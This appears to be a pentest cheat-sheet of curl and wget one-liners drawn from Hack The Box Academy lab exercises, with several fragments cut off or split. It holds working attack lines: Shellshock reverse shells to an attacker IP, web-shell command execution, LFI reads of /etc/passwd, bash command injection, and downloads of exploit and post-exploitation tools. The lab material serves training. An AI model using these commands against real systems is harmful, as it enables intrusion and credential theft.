## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - try-to-download-the-contracts-of-the-first-20-employee-one-of-which-sh
#cat/ATTACK/FILE_TRANSFERT #cpts
After spawning the target machine and viewing the page source of the `/contracts.php` page, students will notice that the `/download.php` page takes the `contract` parameter with the value being the base64 of `uid`: Thus

```
for hash in $(echo -n $i | base64 -w 0); do
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - try-to-download-the-contracts-of-the-first-20-employee-one-of-which-sh-2
#cat/ATTACK/FILE_TRANSFERT #cpts
After spawning the target machine and viewing the page source of the `/contracts.php` page, students will notice that the `/download.php` page takes the `contract` parameter with the value being the base64 of `uid`: Thus

```
curl -sOJ "http://STMIP:STMPO/download.php?contract=$hash"
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - try-to-change-the-admins-email-to-flagidorhtbmailtoflagidorhtb-and-you
#cat/ATTACK/FILE_TRANSFERT #cpts
After spawning the target machine, students first need to attain the `uuid` of an admin account. To do so, students need to enumerate over the `uid` of the employees using the `/profile/api.php/profile/` endpoint using a

```
curl -s "http://STMIP:STMPO/profile/api.php/profile/$uid"; echo
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - try-to-escalate-your-privileges-and-exploit-different-vulnerabilities-
#cat/ATTACK/FILE_TRANSFERT #cpts
After spawning the target machine, students need to visit its website's root page and login with the credentials `htb-student:Academy_student!`, making sure to have the Network tab of the Web Developer Tools (`FN` + `F12

```
curl -s "http://STMIP:STMPO/api.php/user/$uid"; echo
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - using-aquatone
#cat/ATTACK/FILE_TRANSFERT #cpts
[Aquatone](https://github.com/michenriksen/aquatone), as mentioned before, is similar to EyeWitness and can take screenshots when provided a `.txt` file of hosts or an Nmap `.xml` file with the `-nmap` flag. We can compi

```
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - code-execution
#cat/ATTACK/FILE_TRANSFERT #cpts
The code above should let us execute commands via the GET parameter `0`. We add this single line to the file just below the comments to avoid too much modification of the contents. http://blog.inlanefreight.local/wp-admi

```
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - vulnerable-plugins---mail-masta
#cat/ATTACK/FILE_TRANSFERT #cpts
As we can see, the `pl` parameter allows us to include a file without any type of input validation or sanitization. Using this, we can include arbitrary files on the webserver. Let's exploit this to retrieve the contents

```
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - vulnerable-plugins---wpdiscuz
#cat/ATTACK/FILE_TRANSFERT #cpts
The exploit as written may fail, but we can use `cURL` to execute commands using the uploaded web shell. We just need to append `?cmd=` after the `.php` extension to run commands which we can see in the exploit script.

```
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - enumeration
#cat/ATTACK/FILE_TRANSFERT #cpts
Another quick way to identify a WordPress site is by looking at the page source. Viewing the page with `cURL` and grepping for `WordPress` can help us confirm that WordPress is in use and footprint the version number, wh

```
curl -s http://blog.inlanefreight.local | grep WordPress
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - enumeration-2
#cat/ATTACK/FILE_TRANSFERT #cpts
Browsing the site and perusing the page source will give us hints to the theme in use, plugins installed, and even usernames if author names are published with posts. We should spend some time manually browsing the site

```
curl -s http://blog.inlanefreight.local/ | grep themes
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - enumeration-3
#cat/ATTACK/FILE_TRANSFERT #cpts
Next, let's take a look at which plugins we can uncover.

```
curl -s http://blog.inlanefreight.local/ | grep plugins
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - enumeration-4
#cat/ATTACK/FILE_TRANSFERT #cpts
From the output above, we know that the [Contact Form 7](https://wordpress.org/plugins/contact-form-7/) and [mail-masta](https://wordpress.org/plugins/mail-masta/) plugins are installed. The next step would be enumeratin

```
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - joomla---discovery-enumeration
#cat/ATTACK/FILE_TRANSFERT #cpts
* * * [Joomla](https://www.joomla.org/), released in August 2005 is another free and open-source CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more. It is written in PHP and use

```
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - discoveryfootprinting
#cat/ATTACK/FILE_TRANSFERT #cpts
Let's assume that we come across an e-commerce site during an external penetration test. At first glance, we are not exactly sure what is running, but it does not appear to be fully custom. If we can fingerprint what the

```
curl -s http://dev.inlanefreight.local/ | grep Joomla
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - discoveryfootprinting-2
#cat/ATTACK/FILE_TRANSFERT #cpts
We can also often see the telltale Joomla favicon (but not always). We can fingerprint the Joomla version if the `README.txt` file is present.

```
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - discoveryfootprinting-3
#cat/ATTACK/FILE_TRANSFERT #cpts
In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml`.

```
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - abusing-built-in-functionality
#cat/ATTACK/FILE_TRANSFERT #cpts
http://dev.inlanefreight.local/administrator/index.php?option=com_templates&view=template&id=506&file=L2Vycm9yLnBocA%3D%3D Once this is in, click on `Save & Close` at the top and confirm code execution using `cURL`.

```
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - discoveryfootprinting-4
#cat/ATTACK/FILE_TRANSFERT #cpts
During an external penetration test, we encounter what appears to be a CMS, but we know from a cursory review that the site is not running WordPress or Joomla. We know that CMS' are often "juicy" targets, so let's dig in

```
curl -s http://drupal.inlanefreight.local | grep Drupal
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - enumeration-5
#cat/ATTACK/FILE_TRANSFERT #cpts
Once we have discovered a Drupal instance, we can do a combination of manual and tool-based (automated) enumeration to uncover the version, installed plugins, and more. Depending on the Drupal version and any hardening m

```
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - enumeration-6
#cat/ATTACK/FILE_TRANSFERT #cpts
Here we have identified an older version of Drupal in use. Trying this against the latest Drupal version at the time of writing, we get a 404 response.

```
curl -s http://drupal.inlanefreight.local/CHANGELOG.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - leveraging-the-php-filter-module
#cat/ATTACK/FILE_TRANSFERT #cpts
http://drupal-qa.inlanefreight.local/#overlay=node/add/page We also want to make sure to set `Text format` drop-down to `PHP code`. After clicking save, we will be redirected to the new page, in this example `http://drup

```
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - leveraging-the-php-filter-module-2
#cat/ATTACK/FILE_TRANSFERT #cpts
From version 8 onwards, the [PHP Filter](https://www.drupal.org/project/php/releases/8.x-1.1) module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we wo

```
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - uploading-a-backdoored-module
#cat/ATTACK/FILE_TRANSFERT #cpts
Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module suc

```
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - uploading-a-backdoored-module-2
#cat/ATTACK/FILE_TRANSFERT #cpts
Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module suc

```
tar xvf captcha-8.x-1.2.tar.gz
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - uploading-a-backdoored-module-3
#cat/ATTACK/FILE_TRANSFERT #cpts
Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupa

```
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - drupalgeddon2
#cat/ATTACK/FILE_TRANSFERT #cpts
We can check quickly with `cURL` and see that the `hello.txt` file was indeed uploaded.

```
curl -s http://drupal-dev.inlanefreight.local/hello.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - drupalgeddon2-3
#cat/ATTACK/FILE_TRANSFERT #cpts
Finally, we can confirm remote code execution using `cURL`.

```
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - discoveryfootprinting-5
#cat/ATTACK/FILE_TRANSFERT #cpts
During our external penetration test, we run EyeWitness and see one host listed under "High Value Targets." The tool believes the host is running Tomcat, but we must confirm to plan our attacks. If we are dealing with To

```
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - tomcat-manager---war-file-upload
#cat/ATTACK/FILE_TRANSFERT #cpts
```
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - tomcat-manager---war-file-upload-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
zip -r backup.war cmd.jsp
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - tomcat-manager---war-file-upload-3
#cat/ATTACK/FILE_TRANSFERT #cpts
Click on `Browse` to select the .war file and then click on `Deploy`. This file is uploaded to the manager GUI, after which the `/backup` application will be added to the table. http://web01.inlanefreight.local:8180/mana

```
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - discoveryfootprintingenumeration
#cat/ATTACK/FILE_TRANSFERT #cpts
From the Nmap scan above, we can see the service `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` detected on port 8080. PRTG also shows up in the EyeWitness scan we performed earlier. Here we can see that Eye

```
curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)" | grep version
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - confirming-the-vulnerability
#cat/ATTACK/FILE_TRANSFERT #cpts
To check for the vulnerability, we can use a simple `cURL` command or use Burp Suite Repeater or Intruder to fuzz the user-agent field. Here we can see that the contents of the `/etc/passwd` file are returned to us, thus

```
curl -H 'User-Agent: () { :; }; echo
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - confirming-the-vulnerability-2
#cat/ATTACK/FILE_TRANSFERT #cpts
To check for the vulnerability, we can use a simple `cURL` command or use Burp Suite Repeater or Intruder to fuzz the user-agent field. Here we can see that the contents of the `/etc/passwd` file are returned to us, thus

```
echo
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - confirming-the-vulnerability-3
#cat/ATTACK/FILE_TRANSFERT #cpts
To check for the vulnerability, we can use a simple `cURL` command or use Burp Suite Repeater or Intruder to fuzz the user-agent field. Here we can see that the contents of the `/etc/passwd` file are returned to us, thus

```
/bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - exploitation-to-reverse-shell-access
#cat/ATTACK/FILE_TRANSFERT #cpts
Once the vulnerability has been confirmed, we can obtain reverse shell access in many ways. In this example, we use a simple Bash one-liner and get a callback on our Netcat listener.

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - using-the-methods-shown-in-this-section-find-another-system-user-whose
#cat/ATTACK/FILE_TRANSFERT #cpts
From the previously attained enumeration output produced by `WPScan`, students will know that the plugin `mail-masta` is being utilized by the web application, thus, they need to exploit its vulnerability which allows di

```
curl -s blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd | grep "/bin/bash"
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - using-the-methods-shown-in-this-section-find-another-system-user-whose-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ curl -s blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd | grep "/bin/bash"
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - fingerprint-the-joomla-version-in-use-on-httpappinlanefreightlocal-for
#cat/ATTACK/FILE_TRANSFERT #cpts
After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`: - `STMIP app.inlanefreight.local` Subsequently, students need to run the following command to enu

```
curl -s app.inlanefreight.local/README.txt | head -n 4
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - fingerprint-the-joomla-version-in-use-on-httpappinlanefreightlocal-for-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ curl -s app.inlanefreight.local/README.txt | head -n 4
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - identify-the-drupal-version-number-in-use-on-drupal-qainlanefreightloc
#cat/ATTACK/FILE_TRANSFERT #cpts
After spawning the target machine, students need to make sure that the following `VHost` entry is present in `/etc/hosts`: - `STMIP drupal-qa.inlanefreight.local` Subsequently, students need to read the "CHANGELOG.txt" f

```
└──╼ [★]$ curl -s http://drupal-qa.inlanefreight.local/CHANGELOG.txt | grep -m1 "Drupal"
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - after-running-the-url-encoded-whoami-payload-what-user-is-tomcat-runni
#cat/ATTACK/FILE_TRANSFERT #cpts
Students need use `welcome.bat` to run `whoami` from `c:\windows\system32\whoami.exe`, making sure to URL-encode it before sending it. Students will find that the tomcat user is running as `feldspar\omen`:

```
curl 'http://STMIP:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe'
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - enumerate-the-host-exploit-the-shellshock-vulnerability-and-submit-the
#cat/ATTACK/FILE_TRANSFERT #cpts
Students then need to test if the endpoint suffers from Shellshock via `access.cgi`, finding it to be vulnerable:

```
/bin/cat /etc/passwd' bash -s :'' http://STMIP/cgi-bin/access.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - enumerate-the-host-exploit-the-shellshock-vulnerability-and-submit-the-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ curl -H 'User-Agent: () { :; }; echo
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - enumerate-the-host-exploit-the-shellshock-vulnerability-and-submit-the-4
#cat/ATTACK/FILE_TRANSFERT #cpts
Then, students need to send a reverse-shell payload:

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1' http://STMIP/cgi-bin/access.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - all-hidden-files
#cat/ATTACK/FILE_TRANSFERT #cpts
```
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - gtfobins
#cat/ATTACK/FILE_TRANSFERT #cpts
```
for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - docker-sockets
#cat/ATTACK/FILE_TRANSFERT #cpts
From here on, we can use the `docker` binary to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.com/linux/x

```
:/tmp$ wget https://<host>:443/docker -O docker
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - docker-sockets-2
#cat/ATTACK/FILE_TRANSFERT #cpts
From here on, we can use the `docker` binary to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.com/linux/x

```
:/tmp$ ls -l
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - docker-sockets-3
#cat/ATTACK/FILE_TRANSFERT #cpts
From here on, we can use the `docker` binary to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.com/linux/x

```
:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - k8s-api-server-interaction
#cat/ATTACK/FILE_TRANSFERT #cpts
```
:~$ curl https://10.129.10.11:6443 -k
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - kubelet-api---extracting-pods
#cat/ATTACK/FILE_TRANSFERT #cpts
```
:~$ curl https://10.129.10.11:10250/pods -k | jq .
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - cve-2021-22555
#cat/ATTACK/FILE_TRANSFERT #cpts
```
:~$ gcc -m32 -static exploit.c -o exploit
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - escalate-privileges-using-a-different-kernel-exploit-submit-the-conten
#cat/ATTACK/FILE_TRANSFERT #cpts
Having identified the OS version as `Ubuntu 18.04 LTS`, students need to use Google to find a corresponding kernel exploit; ultimately discovering [CVE-2021-3493](https://github.com/briskets/CVE-2021-3493). Students need

```
wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/main/exploit.c
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - escalate-privileges-using-a-different-kernel-exploit-submit-the-conten-2
#cat/ATTACK/FILE_TRANSFERT #cpts
Having identified the OS version as `Ubuntu 18.04 LTS`, students need to use Google to find a corresponding kernel exploit; ultimately discovering [CVE-2021-3493](https://github.com/briskets/CVE-2021-3493). Students need

```
gcc exploit.c -o kernelExploit
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - escalate-privileges-using-a-different-kernel-exploit-submit-the-conten-3
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ gcc exploit.c -o kernelExploit
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - a-idis-it-vulnerableais-it-vulnerableis-it-vulnerable
#cat/ATTACK/FILE_TRANSFERT #cpts
It works fine like this.

```
$ curl -d num=100 http://localhost/index.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - a-idis-it-vulnerableais-it-vulnerableis-it-vulnerable-2
#cat/ATTACK/FILE_TRANSFERT #cpts
It works fine like this.

```
$ curl -d num=101 http://localhost/index.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - a-idis-it-vulnerableais-it-vulnerableis-it-vulnerable-3
#cat/ATTACK/FILE_TRANSFERT #cpts
And also, empty, non-digit, and any other invalid parameters are rejected properly.

```
$ curl -d num='' http://localhost/index.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - a-idis-it-vulnerableais-it-vulnerableis-it-vulnerable-4
#cat/ATTACK/FILE_TRANSFERT #cpts
And also, empty, non-digit, and any other invalid parameters are rejected properly.

```
$ curl -d num=abcdefg http://localhost/index.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - a-idis-it-vulnerableais-it-vulnerableis-it-vulnerable-5
#cat/ATTACK/FILE_TRANSFERT #cpts
And also, empty, non-digit, and any other invalid parameters are rejected properly.

```
$ curl -d num='true ]] && [[ 100' http://localhost/index.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - a-idis-it-vulnerableais-it-vulnerableis-it-vulnerable-6
#cat/ATTACK/FILE_TRANSFERT #cpts
And also, empty, non-digit, and any other invalid parameters are rejected properly.

```
$ curl -d num='\\;"\\"""""";;;~``~\\' http://localhost/index.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - a-idis-it-vulnerableais-it-vulnerableis-it-vulnerable-7
#cat/ATTACK/FILE_TRANSFERT #cpts
Let's execute this command.

```
$ curl -d num='x[$(cat /etc/passwd > /proc/$$/fd/1)]' http://localhost/index.cgi
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - install-python-dependencies-local-vm-only
#cat/ATTACK/FILE_TRANSFERT #cpts
To make the tool work in our Pwnbox, we must use the `pyenv` command to manage the Python versions and switch to Python 2.7, which the tool supports. We will not cover the installation of `pyenv`, as it is preinstalled;

```
wget https://files.pythonhosted.org/packages/28/84/27df240f3f8f52511965979aad7c7b77606f8fe41d4c90f2449e02172bb1/setuptools-2.0.tar.gz
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - install-python-dependencies-local-vm-only-2
#cat/ATTACK/FILE_TRANSFERT #cpts
To make the tool work in our Pwnbox, we must use the `pyenv` command to manage the Python versions and switch to Python 2.7, which the tool supports. We will not cover the installation of `pyenv`, as it is preinstalled;

```
tar -xf setuptools-2.0.tar.gz
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - install-python-dependencies-local-vm-only-3
#cat/ATTACK/FILE_TRANSFERT #cpts
To make the tool work in our Pwnbox, we must use the `pyenv` command to manage the Python versions and switch to Python 2.7, which the tool supports. We will not cover the installation of `pyenv`, as it is preinstalled;

```
cd setuptools-2.0/
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - install-python-dependencies-local-vm-only-4
#cat/ATTACK/FILE_TRANSFERT #cpts
To make the tool work in our Pwnbox, we must use the `pyenv` command to manage the Python versions and switch to Python 2.7, which the tool supports. We will not cover the installation of `pyenv`, as it is preinstalled;

```
python2.7 setup.py install
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - install-python-dependencies-local-vm-only-5
#cat/ATTACK/FILE_TRANSFERT #cpts
To make the tool work in our Pwnbox, we must use the `pyenv` command to manage the Python versions and switch to Python 2.7, which the tool supports. We will not cover the installation of `pyenv`, as it is preinstalled;

```
wget https://files.pythonhosted.org/packages/42/85/25caf967c2d496067489e0bb32df069a8361e1fd96a7e9f35408e56b3aab/xlrd-1.0.0.tar.gz
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - install-python-dependencies-local-vm-only-6
#cat/ATTACK/FILE_TRANSFERT #cpts
To make the tool work in our Pwnbox, we must use the `pyenv` command to manage the Python versions and switch to Python 2.7, which the tool supports. We will not cover the installation of `pyenv`, as it is preinstalled;

```
tar -xf xlrd-1.0.0.tar.gz
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - install-python-dependencies-local-vm-only-7
#cat/ATTACK/FILE_TRANSFERT #cpts
To make the tool work in our Pwnbox, we must use the `pyenv` command to manage the Python versions and switch to Python 2.7, which the tool supports. We will not cover the installation of `pyenv`, as it is preinstalled;

```
cd xlrd-1.0.0/
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - perform-vhost-discovery-what-additional-vhost-exists
#cat/ATTACK/FILE_TRANSFERT #cpts
(Students need to make sure that the `STMIP inlanefreight.local` entry is present in `/etc/hosts`, as done in Question 1.) A plethora of tools exist that students can utilize to perform VHost bruteforcing, including `ffu

```
curl -s -I http://STMIP -H "Host: defnotvalid.inlanefreight.local" | grep "Content-Length:"
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - perform-vhost-discovery-what-additional-vhost-exists-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ curl -sI http://10.129.203.114/ -H "Host: defnotvalid.inlanefreight.local" | grep "Content-Length:"
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - exploit-the-http-verb-tampering-vulnerability-to-find-a-flag-submit-th
#cat/ATTACK/FILE_TRANSFERT #cpts
Thereafter, students need to click on "Browse" to upload the web shell: Students need to make sure that they change the setting "All Supported Types" to "All Files", then select the PHP web shell: Subsequently, students

```
curl -s http://dev.inlanefreight.local/uploads/9125309563421.php?cmd=cat /var/www/html/flag.txt
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - exploit-the-http-verb-tampering-vulnerability-to-find-a-flag-submit-th-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
└──╼ [★]$ curl -s "http://dev.inlanefreight.local/uploads/9125309563421.php?cmd=cat+/var/www/html/flag.txt"
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the
#cat/ATTACK/FILE_TRANSFERT #cpts
Thereafter, students need to use `DNN` again to upload [nc.exe](https://github.com/int0x33/nc.exe/raw/master/nc.exe) and [PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.ex

```
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-2
#cat/ATTACK/FILE_TRANSFERT #cpts
```
nc.exe 100%[=============================================================================>] 37.71K --.-KB/s in 0s
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - find-a-backup-script-that-contains-the-password-for-the-backupadm-user
#cat/ATTACK/FILE_TRANSFERT #cpts
Once the path is known, students then need to download [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) and [Snaffler](https://github.com/SnaffCon/Snaffler/release

```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-2
#cat/ATTACK/FILE_TRANSFERT #cpts
Once the path is known, students then need to download [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) and [Snaffler](https://github.com/SnaffCon/Snaffler/release

```
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.44/Snaffler.exe
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - find-a-backup-script-that-contains-the-password-for-the-backupadm-user-3
#cat/ATTACK/FILE_TRANSFERT #cpts
```
PowerView.ps1 100%[=============================================================================>] 752.23K --.-KB/s in 0.004s
```

## Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - Curl / Wget / download - obtain-the-ntlmv2-password-hash-for-the-mpalledorous-user-and-crack-it
#cat/ATTACK/FILE_TRANSFERT #cpts
Using the same RDP session that students have established and escalated privileges on from the previous question, they need to transfer [Inveigh.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Invei

```
wget https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1
```

